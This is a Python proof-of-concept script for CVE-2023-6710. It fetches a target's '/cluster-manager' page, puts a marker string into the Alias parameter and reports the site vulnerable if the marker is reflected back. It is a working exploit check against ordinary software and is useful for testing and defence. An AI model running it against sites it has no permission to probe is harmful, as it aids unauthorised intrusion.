import requests
import argparse
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from requests.exceptions import MissingSchema

class Colors:
    RED = '\033[91m'
    GREEN = '\033[1;49;92m'
    RESET = '\033[0m'

def get_cluster_manager_url(base_url):
    # Make a GET request to the specified website
    try:
        response = requests.get(base_url + '/cluster-manager')
        response.raise_for_status()  # Raise an exception for bad responses (4xx or 5xx)
    except requests.exceptions.RequestException as e:
        print(Colors.RED + f"Error: {e}" + Colors.RESET)
        return None

    print(Colors.GREEN + "Start exploit check..." + Colors.RESET)

    # Check if the response is successful (status code 200)
    if response.status_code == 200:
        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all 'a' tags with 'href' attribute
        all_links = soup.find_all('a', href=True)

        # Search for the link containing (/cluster-manager?) in the href attribute
        cluster_manager_url = None
        for link in all_links:
            match = re.search(r'/cluster-manager\?.*?/funambol', link['href'])
            if match:
                cluster_manager_url = match.group(0)
                break

        return cluster_manager_url

    # If the response is not successful, print an error message
    print(Colors.RED + f"Error: Unable to fetch data from {base_url}")
    return None

def update_alias_value(url, new_alias_value):
    # Parse the URL
    parsed_url = urlparse(url)

    # Parse the query parameters
    query_params = parse_qs(parsed_url.query)

    # Update the Alias parameter value
    query_params['Alias'] = [new_alias_value]

    # Reconstruct the URL with the updated query parameters
    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))

    return updated_url

def check_response_for_value(url, check_value):
    # Make a GET request to the specified URL
    response = requests.get(url)

    # Check if the response contains the specified value
    if check_value in response.text:
        print(Colors.RED +"Website is vulnerable POC by :")
        print(Colors.GREEN +"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """)
    else:
        print(Colors.GREEN +"Website is not vulnerable POC by :")
        print(Colors.GREEN +"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """)

def main():
    # Create a command-line argument parser
    parser = argparse.ArgumentParser(description="python CVE-2023-6710.py -u https://example.com")
    
    # Add a command-line argument for the website URL (-u/--url)
    parser.add_argument('-u', '--url', help='Website URL', required=True)

    # Parse the command-line arguments
    args = parser.parse_args()

    # Get the cluster manager URL from the specified website
    cluster_manager_url = get_cluster_manager_url(args.url)

    # Check if the cluster manager URL is found
    if cluster_manager_url:

        # Modify the URL by adding the cluster manager value
        modified_url = args.url + cluster_manager_url

        # Update the Alias parameter value to "agent-47"
        modified_url = update_alias_value(modified_url, "DedSec-47")
        print(Colors.GREEN + "Check executed successfully" + Colors.RESET)

        # Check the response for the value "agent-47"
        check_response_for_value(modified_url, "DedSec-47")

if __name__ == "__main__":
    main()
